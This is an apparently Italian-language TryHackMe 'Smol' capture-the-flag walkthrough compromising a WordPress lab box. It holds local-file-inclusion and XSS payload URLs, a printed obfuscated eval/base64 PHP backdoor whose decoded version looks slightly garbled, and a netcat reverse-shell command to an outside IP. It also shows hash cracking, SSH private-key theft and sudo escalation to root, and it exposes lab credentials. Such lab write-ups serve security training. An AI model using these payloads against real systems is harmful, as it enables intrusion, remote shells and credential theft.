
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/smol

Al centro di **Smol** c'è un sito web WordPress, un obiettivo comune a causa del suo vasto ecosistema di plugin. La macchina mostra un plugin vulnerabile pubblicamente noto, evidenziando i rischi di trascurare gli aggiornamenti software e le patch di sicurezza. Per migliorare l'esperienza di apprendimento, Smol introduce un plugin backdoored, sottolineando l'importanza di un'ispezione meticolosa del codice prima di integrare componenti di terze parti.

```
nmap -Pn -sV -O --open -p- 10.10.56.176
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

```
nano /etc/hosts
```
```
10.10.56.176    www.smol.thm
```

```
http://www.smol.thm/
```

```
whatweb http://www.smol.thm/index.php                                                                 
```
```
whatweb http://www.smol.thm/index.php                                                                 
http://www.smol.thm/index.php [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.56.176], RedirectLocation[http://www.smol.thm/], UncommonHeaders[x-redirect-by]                         
http://www.smol.thm/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.56.176], JQuery[3.7.1], MetaGenerator[WordPress 6.4.3], Script, Title[AnotherCTF], UncommonHeaders[link], WordPress[6.4.3]
```

```
wpscan --url http://www.smol.thm --enumerate p
```

```
WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jan 25 06:22:18 2025
[+] Requests Done: 32
[+] Cached Requests: 5
[+] Data Sent: 7.722 KB
[+] Data Received: 171.435 KB
[+] Memory used: 251.891 MB
[+] Elapsed time: 00:00:05

```

```
http://www.smol.thm/wp-content/themes/twentytwentythree/
```

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/
```

```
http://www.smol.thm/wp-content/uploads/
```



```
nmap -sV --script http-wordpress-enum 10.10.56.176 80
```
```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    akismet 5.2
```

```
nuclei -u http://10.10.56.176:80
```
```

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /root/.local/nuclei-templates
[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.5 (outdated)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 8968
[INF] Executing 8770 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.live
[missing-sri] [http] [info] http://www.smol.thm ["http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09","http://www.smol.thm/wp-includes/js/dist/interactivity.min.js?ver=6.4.3","http://www.smol.thm/wp-includes/blocks/navigation/view.min.js?ver=e3d6f3216904b5b42831","http://www.smol.thm/wp-includes/js/jquery/jquery.min.js?ver=3.7.1","http://www.smol.thm/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1","http://www.smol.thm/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2","http://www.smol.thm/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.2","http://www.smol.thm/wp-includes/blocks/navigation/style.min.css?ver=6.4.3"]                                                                                                           
[waf-detect:apachegeneric] [http] [info] http://10.10.56.176:80
[CVE-2023-48795] [javascript] [medium] 10.10.56.176:22 ["Vulnerable to Terrapin"]
[ssh-server-enumeration] [javascript] [info] 10.10.56.176:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9"]
[ssh-sha1-hmac-algo] [javascript] [info] 10.10.56.176:22
[openssh-detect] [tcp] [info] 10.10.56.176:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9"]
                    
```

```
gobuster dir -u http://10.10.56.176:80 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 0] [--> http://www.smol.thm]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
```

```
http://www.smol.thm/wp-login.php
```

Il plugin WordPress JSmol2WP 1.07 è suscettibile all'inclusione di file locali tramite ../ directory traversal in query=php://filter/resource= nella stringa di query jsmol.php. Un aggressore può eventualmente ottenere informazioni sensibili, modificare dati e/o eseguire operazioni amministrative non autorizzate nel contesto del sito interessato. Ciò può anche essere sfruttato per la falsificazione di richieste lato server.

CVE-2018-20463

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt


Il report che hai fornito descrive due vulnerabilità di sicurezza nel plugin WordPress "jsmol2wp". Ecco una spiegazione dettagliata di ciascuna vulnerabilità:

### 1. Vulnerabilità di lettura arbitraria di file e SSRF (CVE-2018-20463)

- **Descrizione**: Questa vulnerabilità consente a un attaccante di leggere file arbitrari sul server. La vulnerabilità si trova nella linea 137 del file `jsmol.php`, dove il parametro `$query` viene passato direttamente alla funzione `file_get_contents()`. Questo significa che un attaccante può controllare il contenuto di `$query` e, di conseguenza, il file che viene letto.
    
- **Esempio di attacco**: Utilizzando un URL appositamente costruito, un attaccante può sfruttare questa vulnerabilità per leggere file sensibili sul server. Ad esempio, l'attaccante può inviare una richiesta come questa:
    
    Code
    
    Copia codice
    
    `http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
    
    In questo caso, l'attaccante sta cercando di leggere il file `wp-config.php`, che contiene informazioni sensibili sulla configurazione di WordPress.
    
- **SSRF**: La vulnerabilità è anche classificata come Server-Side Request Forgery (SSRF) perché l'attaccante può utilizzare la vulnerabilità per fare richieste a risorse interne del server.
    

### 2. Vulnerabilità di Cross-Site Scripting riflesso (XSS) (CVE-2018-20462)

- **Descrizione**: Questa vulnerabilità consente a un attaccante di iniettare codice JavaScript malevolo in una pagina web, che verrà eseguito nel browser della vittima. Si trova nella linea 157 del file `jsmol.php`. La vulnerabilità è riflessa, il che significa che il codice malevolo viene eseguito immediatamente quando la vittima visita l'URL contenente il payload.
    
- **Esempio di attacco**: Un attaccante può inviare un URL come il seguente per iniettare un payload XSS:
    
    Code
    
    Copia codice
    
    `http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=<script>alert(/xss/)</script>&mimetype=text/html; charset=utf-8`
    
    Questo codice inietterà un alert nel browser della vittima.
    
- **Utilizzo di Base64**: La vulnerabilità può essere ulteriormente sfruttata utilizzando la codifica Base64 per bypassare i filtri del browser. L'attaccante può inviare un payload codificato in Base64:
    
    Code
    
    Copia codice
    
    `http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&mimetype=text/html; charset=utf-8&encoding=base64`
    
    In questo caso, il payload `<script>alert(/xss/)</script>` è codificato in Base64, rendendo più difficile per i filtri del browser rilevarlo.
    

### Conclusione

Il report evidenzia due vulnerabilità significative nel plugin "jsmol2wp" che possono essere sfruttate da un attaccante per compromettere la sicurezza di un sito WordPress. È importante che gli amministratori di sistema e i proprietari di siti web verifichino se stanno utilizzando questo plugin e, in caso affermativo, considerino di aggiornarlo o rimuoverlo per mitigare i rischi associati a queste vulnerabilità.


```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
	### Vulnerabilità di lettura arbitraria di file e SSRF (CVE-2018-20463)
	
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

```
http://www.smol.thm/wp-admin/
```
user:
```
wpuser
```
password:
```
kbLSF2Vop#lw3rjDZ629*Z%G
```

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=<script>alert(/xss/)</script>&mimetype=text/html; charset=utf-8
```
	### Vulnerabilità di Cross-Site Scripting riflesso (XSS) (CVE-2018-20462)

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=/etc/passwd
```


```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-settings.php
```

```
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```
Utenti
- **root**: L'utente con UID 0, ha accesso completo al sistema e può eseguire qualsiasi comando.
- **www-data**: Spesso utilizzato per il server web, con shell impostata su `/usr/sbin/nologin`, il che significa che non può accedere al sistema tramite una shell.
- **think**, **xavi**, **diego**, **gege**: Questi sono utenti normali con shell impostata su `/bin/bash`, il che significa che possono accedere al sistema e utilizzare la shell.


https://www.hackingarticles.in/wordpress-reverse-shell/

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-admin/plugins.php
```

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=SELECT * FROM wp_users
```

```
<script>alert(document.cookie)</script>
```

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=<script>alert(document.cookie)</script>&mimetype=text/html; charset=utf-8
```


https://medium.com/@maxbsec/smol-ctf-tryhackme-8805d4e584c9

```
http://www.smol.thm/wp-admin/post.php?post=58&action=edit
```

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

```
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```
La funzione `eval()` in PHP esegue il codice PHP fornito come stringa. Quindi, il risultato della decodifica Base64 viene passato a `eval()`
Dopo la decodifica, il codice diventa:
```
if (isset($_GET["\14\155\164\64"])){ system($_GET["\14\3\x6d\144"]); }
```
==Cosa Fa il Codice==

1. **Controllo di un Parametro GET**:
    
    - Il codice controlla se esiste un parametro GET con una chiave specifica (che, dopo la decodifica, risulta essere una stringa di caratteri speciali). In questo caso, la chiave è rappresentata da caratteri ASCII codificati.
2. **Esecuzione di un Comando di Sistema**:
    
    - Se il parametro GET esiste, il codice esegue un comando di sistema utilizzando la funzione `system()`, passando un altro parametro GET come argomento. Questo significa che l'attaccante può eseguire comandi arbitrari sul server.

 ==Rischi e Conseguenze==

- **Vulnerabilità di Sicurezza**: Questo tipo di codice è un esempio di vulnerabilità di tipo Remote Code Execution (RCE). Se un attaccante riesce a inviare una richiesta GET con i parametri appropriati, può eseguire comandi arbitrari sul server, compromettendo la sicurezza del sistema.
    
- **Uso Malevolo**: Codici come questo sono spesso utilizzati in attacchi per compromettere server web, installare malware o rubare dati.
    
==Conclusione==

Il codice fornito è altamente pericoloso e rappresenta una vulnerabilità di sicurezza. È fondamentale evitare l'uso di `eval()` e di funzioni simili in PHP, specialmente con input non sanitizzati, per prevenire attacchi di tipo RCE. Se trovi codice simile nel tuo ambiente, è consigliabile rimuoverlo immediatamente e indagare su come è stato inserito.

Un'ulteriore analisi del codice ha rivelato che questa funzionalità è legata alla seguente azione di WordPress:

```
add_action ( 'admin_notices' , 'hello_dolly' );
```

Ciò significa che la backdoor viene eseguita ogni volta che il pannello di amministrazione di WordPress visualizza un avviso.

 **accedendo al pannello di amministrazione di WordPress, posso attivare la backdoor ed eseguire comandi arbitrari aggiungendoli `?cmd=`all'URL.**

mi reco sulla dashboard del pannello wordpress e su url digito
```
www.smol.thm/wp-admin/index.php?cmd=whoami
```
ottengo www-data
```
nc -lvnp 1234
```

```
www.smol.thm/wp-admin/index.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.116.149 1234 >/tmp/f
```

```
?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.11.116.149%201234%20%3E%2Ftmp%2Ff
```

```
mysql -u wpuser -p -h localhost
```

```
kbLSF2Vop#lw3rjDZ629*Z%G
```

```
USE wordpress;
```
`
```
SHOW tables;
```

```
SELECT ID, user_login, user_pass FROM wp_users;
```

```
+----+------------+------------------------------------+
| ID | user_login | user_pass                          |
+----+------------+------------------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 
```

Adesso abbiamo alcuni hash da decifrare con hashcat.
```
nano hashes.txt
```

```
hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
diego:sandiegocalifornia
```

```
su diego
```

```
cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

```
id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```
	gruppo internal comune

```
diego@smol:/home$ cd think
diego@smol:/home/think$ ls
diego@smol:/home/think$ ls -al
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
diego@smol:/home/think$ cd .ssh
diego@smol:/home/think/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```

```
cat id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-----END OPENSSH PRIVATE KEY-----
```

nano id_rsa
```
ssh think@10.10.174.83 -i id_rsa
```

```
think@smol:/home$ cd gege
think@smol:/home/gege$ ls
wordpress.old.zip
think@smol:/home/gege$ 
```

```
su gege
```

```
python3 -m http.server 8080
```

```
wget http://10.10.174.83:8080/wordpress.old.zip
```

```
zip2john wordpress.old.zip > wzip_hash
```

```
john wzip_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
```
john wzip_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-01-25 15:59) 1.587g/s 12102Kp/s 12102Kc/s 12102KC/s hesse..heres2life
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```
hero_gege@hotmail.com
```

```
unzip wordpress.old.zip
```

```
cd wordpress.old
```

```
cat wp-config.php
```
```
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

```

```
xavi
```
```
P@ssw0rdxavi@
```

```
su xavi
```

```
xavi@smol:~$ ls -al
total 20
drwxr-x--- 2 xavi internal 4096 Aug 18  2023 .
drwxr-xr-x 6 root root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root        9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 xavi xavi      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 xavi xavi     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 xavi xavi      807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root        9 Aug 18  2023 .viminfo -> /dev/null

```

```
sudo -l
```

```
xavi@smol:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

```

```
sudo -i
```
```
xavi@smol:~$ sudo -i
root@smol:~$ ls
total 64K
drwx------  7 root root 4.0K May  2  2024 .
drwxr-xr-x 18 root root 4.0K Mar 29  2024 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
drwx------  2 root root 4.0K Jun  2  2023 .cache
-rw-------  1 root root   35 Mar 29  2024 .lesshst
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Aug 16  2023 root.txt
-rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
drwx------  3 root root 4.0K Jun 21  2023 snap
drwx------  2 root root 4.0K Jun  2  2023 .ssh
-rw-rw-rw-  1 root root  14K May  2  2024 .viminfo

```

```
cat root.txt
```

```
bf89xxxxxxxxxxxxxxxxxxxx
```
